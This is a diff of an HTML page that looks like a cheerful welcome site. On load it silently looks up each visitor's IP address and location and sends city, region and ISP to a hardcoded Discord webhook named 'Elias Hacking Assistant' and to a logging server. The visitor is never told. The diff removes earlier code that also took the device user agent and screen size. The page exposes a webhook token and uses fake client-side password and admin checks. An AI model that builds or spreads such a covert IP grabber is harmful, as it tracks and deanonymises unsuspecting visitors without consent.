@@ -58,56 +58,39 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
     }
 
-    .admin-section {
-      margin-top: 20px;
-      display: none;
+    #password-info {
+      font-size: 1.1rem;
+      color: #555;
+      margin-bottom: 20px;
+      font-weight: normal;
     }
 
-    .admin-button, .test-button {
-      background-color: #3498db;
-      border: none;
-      color: white;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 10px;
+    #password-input {
+      margin-bottom: 10px;
     }
 
-    .admin-button:hover, .test-button:hover {
-      background-color: #2980b9;
-    }
-
-    .password-input {
-      padding: 10px;
-      font-size: 16px;
-      border-radius: 5px;
-      border: 1px solid #ddd;
-      margin: 10px;
-    }
-
-    .password-hint {
-      font-size: 16px;
-      color: #2c3e50;
+    #admin-btn {
       margin-top: 10px;
-      font-style: italic;
     }
 
-    .ip-log {
+    #admin-panel {
+      display: none;
+      margin-top: 20px;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 15px;
+      border-radius: 10px;
+      color: white;
+    }
+
+    #log-box {
       margin-top: 20px;
       padding: 10px;
-      background: #ecf0f1;
-      border-radius: 5px;
-      max-height: 200px;
+      background: rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      font-family: monospace;
+      height: 200px;
       overflow-y: auto;
     }
-    
-    .ip-log p {
-      margin: 5px 0;
-      padding: 3px;
-      border-bottom: 1px solid #ddd;
-    }
-
   </style>
   <script>
     async function fetchIPAndLocation() {
@@ -133,18 +116,11 @@
       }
     }
 
-    async function sendToWebhook(data) {
-      const webhookURL = 'https://discord.com/api/webhooks/1336647287249829959/XjzqGEadFFpE_XrKqyqebZVdTiT23cBckU6-OIExi_W77GVNxxtyeVzwThHy3hRLhGCO'; // Replace with your webhook URL
+    async function sendToDiscord(data) {
+      const webhookURL = 'https://discord.com/api/webhooks/1336647287249829959/XjzqGEadFFpE_XrKqyqebZVdTiT23cBckU6-OIExi_W77GVNxxtyeVzwThHy3hRLhGCO'; // Your Discord webhook URL
 
-      // Collect browser and device information
-      const userActivity = {
-        device: navigator.userAgent,
-        screenSize: `${window.innerWidth}x${window.innerHeight}`,
-      };
-
-      // Prepare the message
       const message = {
-        content: `New visitor detected! 🚀`,
+        content: `New visitor detected!`,
         username: 'Elias Hacking Assistant',
         avatar_url: 'https://i.imgur.com/Af4innD.jpeg',
         embeds: [
@@ -158,8 +134,6 @@
               { name: 'Region', value: data.region, inline: true },
               { name: 'City', value: data.city, inline: true },
               { name: 'ISP', value: data.isp, inline: true },
-              { name: 'Device Info', value: userActivity.device, inline: false },
-              { name: 'Screen Size', value: userActivity.screenSize, inline: false },
             ],
           },
         ],
@@ -182,105 +156,98 @@
       }
     }
 
-    // Admin Login and Test Button Functionality
-    const correctPassword = 'password123'; // Normal user password
-    const adminPassword = 'admin123'; // Admin password
+    async function sendToServer(data) {
+      const serverUrl = 'https://yourserver.com/logs'; // Replace with your server URL
 
-    let isAdmin = false;
-    let ipLogs = []; // Store IP logs for the admin
+      try {
+        const response = await fetch(serverUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
 
-    function showAccessSection() {
-      const passwordInput = document.getElementById("password-input").value;
-      
-      // Check for normal user or admin password
-      if (passwordInput === correctPassword) {
-        // User access granted
-        isAdmin = false;
-        document.querySelector(".container").style.display = "block";
-        document.querySelector(".password-section").style.display = "none";
-        // Start sending IP data
-        initializeNormalAccess();
-      } else if (passwordInput === adminPassword) {
-        // Admin access granted
-        isAdmin = true;
-        document.querySelector(".container").style.display = "block";
-        document.querySelector(".password-section").style.display = "none";
-        document.querySelector(".admin-section").style.display = "block"; // Show admin panel
-      } else {
-        alert("Incorrect password! Please try again.");
+        if (!response.ok) {
+          console.error('Failed to send data to server:', response.statusText);
+        }
+      } catch (error) {
+        console.error('Error sending data to server:', error);
       }
     }
 
     async function initializeNormalAccess() {
       const data = await fetchIPAndLocation();
       if (data) {
-        await sendToWebhook(data);
-        if (isAdmin) {
-          ipLogs.push(data); // Store IP logs for admin view
-          updateIPLogs();
-        }
+        await sendToDiscord(data); // Send real IP logs to Discord
+        await sendToServer(data);  // Send real IP logs to server for storage
       }
     }
 
-    async function sendTestMessage() {
-      const fakeData = {
-        ip: "123.45.67.89",
-        continent: "North America",
-        country: "United States",
-        region: "California",
-        city: "Los Angeles",
-        isp: "Fake ISP Inc.",
+    async function initializeAdminAccess() {
+      document.getElementById("admin-panel").style.display = "block";
+      const fakeLog = {
+        ip: "192.168.1.1",
+        continent: "Europe",
+        country: "FakeLand",
+        region: "Test Region",
+        city: "Test City",
+        isp: "Fake ISP",
       };
-
-      await sendToWebhook(fakeData);
-      ipLogs.push(fakeData); // Store fake log
-      updateIPLogs();
-      alert("Test message sent to Discord!");
+      document.getElementById("log-box").innerText = JSON.stringify(fakeLog, null, 2);
     }
 
-    // Update the displayed IP logs in admin panel
-    function updateIPLogs() {
-      const logContainer = document.getElementById("ip-log-container");
-      logContainer.innerHTML = ''; // Clear previous logs
+    document.addEventListener("DOMContentLoaded", () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('key') === 'ADMIN') {
+        initializeAdminAccess();
+        return;
+      }
+      
+      const messages = ["Welcome, Explorer! 🚀", "Glad to see you! 😃", "You're awesome! 🎉", "Have an epic day! 💥"];
+      const message = messages[Math.floor(Math.random() * messages.length)];
+      document.getElementById("message").textContent = message;
 
-      ipLogs.forEach(log => {
-        const logElement = document.createElement('p');
-        logElement.textContent = `IP: ${log.ip} | Country: ${log.country} | City: ${log.city}`;
-        logContainer.appendChild(logElement);
-      });
-    }
+      // Fun sound effect on load
+      const audio = new Audio("https://www.myinstants.com/media/sounds/that-was-legitness.mp3");
+      setTimeout(() => audio.play(), 500);
 
-    document.addEventListener("DOMContentLoaded", async () => {
-      // Show password hint on the login screen
-      document.getElementById("password-hint").textContent = "The password is password123";
-
-      // Hide container until password is entered
-      document.querySelector(".container").style.display = "none";
-      document.querySelector(".admin-section").style.display = "none";
+      initializeNormalAccess();
     });
+
+    function checkPassword() {
+      const enteredPassword = document.getElementById("password").value;
+      const correctPassword = "password123";
+      const adminPassword = "adminpass"; // Admin password
+
+      if (enteredPassword === correctPassword) {
+        window.location.href = window.location.pathname + '?key=USER';
+      } else if (enteredPassword === adminPassword) {
+        window.location.href = window.location.pathname + '?key=ADMIN';
+      } else {
+        alert('Incorrect password!');
+      }
+    }
   </script>
 </head>
 <body>
-  <div class="password-section" style="text-align:center;">
-    <h2>Enter Password</h2>
-    <input id="password-input" type="password" class="password-input" placeholder="Enter the password" />
-    <br />
-    <button onclick="showAccessSection()">Submit</button>
-    <p id="password-hint" class="password-hint"></p>
-  </div>
-
-  <div class="container" style="display:none;">
+  <div class="container">
     <h1 id="message">Loading...</h1>
     <img class="avatar" src="https://api.dicebear.com/7.x/bottts/svg" alt="Avatar">
     <p>Enjoy your time here! 🌟</p>
-    
-    <!-- Admin Panel -->
-    <div class="admin-section" style="display:none;">
+
+    <!-- Login Section -->
+    <div id="login-section">
+      <p id="password-info">The password is <strong>password123</strong> for normal access, and <strong>adminpass</strong> for admin access.</p>
+      <input type="password" id="password" placeholder="Enter password" />
+      <button onclick="checkPassword()">Enter</button>
+    </div>
+
+    <!-- Admin Section -->
+    <div id="admin-panel">
       <h2>Admin Panel</h2>
-      <button class="test-button" onclick="sendTestMessage()">Send Test Message</button>
-      <div class="ip-log" id="ip-log-container">
-        <!-- IP Logs will be displayed here -->
-      </div>
+      <button onclick="initializeAdminAccess()">Test Send Fake Log</button>
+      <div id="log-box"></div>
     </div>
   </div>
 </body>
